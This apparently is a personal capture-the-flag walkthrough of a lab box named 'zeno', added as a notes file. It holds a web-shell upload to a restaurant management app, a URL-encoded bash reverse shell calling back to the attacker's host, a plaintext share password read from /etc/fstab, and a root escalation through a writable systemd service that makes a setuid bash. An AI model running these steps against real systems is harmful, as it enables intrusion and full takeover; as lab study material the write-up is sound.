@@ -1,0 +1,169 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt  -u http://10.201.46.126:12340/FUZZ/ --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.201.46.126:12340/FUZZ/
+Total requests: 62281
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000386:   200        1006 L   4983 W     74409 Ch    "icons"                                             
+000009419:   200        118 L    416 W      5982 Ch     "rms"  
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit restaurant management system
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Restaurant Management System 1.0  - SQL Injection                                  | php/webapps/51330.txt
+Restaurant Management System 1.0 - Remote Code Execution                           | php/webapps/47520.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -X POST http://10.201.46.126:12340/rms/admin/foods-exec.php -F "photo=@shell.php" -F "Submit=Add"
+The photo shell.php has been uploaded, and your information has been added to the directory                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+http://10.201.46.126:12340/rms/images/shell.php?cmd=id
+
+must be url encoded
+http://10.201.46.126:12340/rms/images/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.6.66.96%2F53%200%3E%261%27
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53                           
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.46.126] 35308
+bash: no job control in this shell
+bash-4.2$ 
+
+
+bash-4.2$ cd /mnt
+bash-4.2$ ls -lsa
+total 0
+0 drwxr-xr-x.  3 root   root    26 Sep 21  2021 .
+0 dr-xr-xr-x. 17 root   root   224 Jun  8  2021 ..
+0 drwxr-xr-x.  2 edward edward   6 Sep 21  2021 secret-share
+bash-4.2$ cd secret-share
+bash-4.2$ ls
+bash-4.2$ ls -lsa
+total 0
+0 drwxr-xr-x. 2 edward edward  6 Sep 21  2021 .
+0 drwxr-xr-x. 3 root   root   26 Sep 21  2021 ..
+bash-4.2$ cat /etc/fstab
+
+#
+# /etc/fstab
+# Created by anaconda on Tue Jun  8 23:56:31 2021
+#
+# Accessible filesystems, by reference, are maintained under '/dev/disk'
+# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
+#
+/dev/mapper/centos-root	/	xfs	defaults	0 0
+UUID=507d63a9-d8cc-401c-a660-bd57acfd41b2	/boot	xfs	defaults	0 0
+/dev/mapper/centos-swap	swap	swap	defaults	0 0
+#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft	0 0
+bash-4.2$ 
+
+
+bash-4.2$ su edward
+Password: 
+[edward@zeno secret-share]$ pwd
+/mnt/secret-share
+[edward@zeno secret-share]$ cd /home
+[edward@zeno home]$ ls -lsa
+total 0
+0 drwxr-xr-x.  3 root root  20 Jul 26  2021 .
+0 dr-xr-xr-x. 17 root root 224 Jun  8  2021 ..
+0 drwxr-xr-x.  3 root root 127 Sep 21  2021 edward
+[edward@zeno home]$ cd edward
+[edward@zeno ~]$ ls -lsa
+total 20
+0 drwxr-xr-x. 3 root root   127 Sep 21  2021 .
+0 drwxr-xr-x. 3 root root    20 Jul 26  2021 ..
+0 lrwxrwxrwx. 1 root root     9 Jul 26  2021 .bash_history -> /dev/null
+4 -rw-r--r--. 1 root root    18 Apr  1  2020 .bash_logout
+4 -rw-r--r--. 1 root root   193 Apr  1  2020 .bash_profile
+4 -rw-r--r--. 1 root root   231 Apr  1  2020 .bashrc
+0 drwxr-xr-x. 2 root root    29 Sep 21  2021 .ssh
+4 -rw-------. 1 root root   699 Jul 26  2021 .viminfo
+4 -rw-r-----. 1 root edward  38 Jul 26  2021 user.txt
+[edward@zeno ~]$ cat user.txt
+THM{070cab2c9dc622e5d25c0709f6cb0510}
+[edward@zeno ~]$ 
+
+
+[edward@zeno ~]$ sudo -l
+Matching Defaults entries for edward on zeno:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
+    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME
+    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User edward may run the following commands on zeno:
+    (ALL) NOPASSWD: /usr/sbin/reboot
+[edward@zeno ~]$ 
+
+
+find / -writable -user root -type f 2>/dev/null
+...
+/etc/systemd/system/zeno-monitoring.service
+...
+
+^C^C[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
+[Unit]
+Description=Zeno monitoring
+
+[Service]
+Type=simple
+User=root
+ExecStart=/root/zeno-monitoring.py
+
+[Install]
+WantedBy=multi-user.target
+[edward@zeno ~]$ 
+
+
+we change to
+
+[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
+[Unit]
+Description=Zeno monitoring
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
+
+[Install]
+WantedBy=multi-user.target
+[edward@zeno ~]$ 
+
+
+
+The setuid bit is set, but the binary is still running as edward because the system likely has SELinux enabled (see the context=unconfined_u:unconfined_r:unconfined_t:... in your id output). SELinux prevents setuid binaries from escalating privileges unless explicitly allowed.
+
+so instead we moved it to /dev/shm bc SELinux is sometimes less strict there.
+
+
+
